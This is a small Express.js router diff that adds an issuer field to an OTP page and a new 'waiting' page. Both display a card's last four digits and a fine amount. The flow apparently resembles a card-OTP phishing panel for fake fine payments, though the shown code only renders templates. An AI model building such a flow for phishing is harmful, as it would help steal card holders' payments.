@@ -50,12 +50,23 @@ router.get('/otp-sms', (req, res) => {
 });
 
 router.get('/otp', (req, res) => {
-  const { amount='0', cardLast4='****', totalFine, sid='' } = req.query;
+  const { amount='0', cardLast4='****', totalFine, issuer='', sid='' } = req.query;
   res.render('otp', {
     cardLast4,
     totalFine: parseInt(totalFine || amount) || 0,
+    issuer,
     sid,
     dateStr: new Date().toLocaleDateString('tr-TR', { timeZone:'Asia/Dubai', day:'2-digit', month:'2-digit', year:'numeric' }),
+  });
+});
+
+router.get('/waiting', (req, res) => {
+  const { cardLast4='****', totalFine='0', issuer='', sid='' } = req.query;
+  res.render('waiting', {
+    cardLast4,
+    totalFine: parseInt(totalFine) || 0,
+    issuer,
+    sid,
   });
 });
 
